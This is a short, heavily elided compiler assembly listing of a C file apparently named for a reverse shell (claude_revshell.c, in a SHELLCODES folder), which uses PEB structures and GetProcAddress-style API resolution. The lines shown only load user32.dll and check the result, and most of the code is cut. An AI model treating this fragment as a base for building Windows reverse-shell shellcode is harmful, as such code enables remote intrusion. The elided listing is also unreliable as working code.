; Listing generated by Microsoft (R) Optimizing Compiler Version 19.44.35222.0 
...
_GetProcAddress$ = 224
main	PROC
; File C:\Users\sriva\Downloads\SHELLCODES\gemini\claude_revshell.c
; Line 14
$LN8:
...
; Line 52
	...
	mov	QWORD PTR user32_dll$[rsp], rax
; Line 53
	cmp	QWORD PTR user32_dll$[rsp], 0
	jne	SHORT $LN5@main
; Line 54
	mov	eax, 5
	jmp	SHORT $LN1@main
...
; Line 58
	...
	mov	rcx, QWORD PTR user32_dll$[rsp]
...
; File C:\Users\sriva\Downloads\SHELLCODES\gemini\peb_structs.h
; Line 104
$LN13:
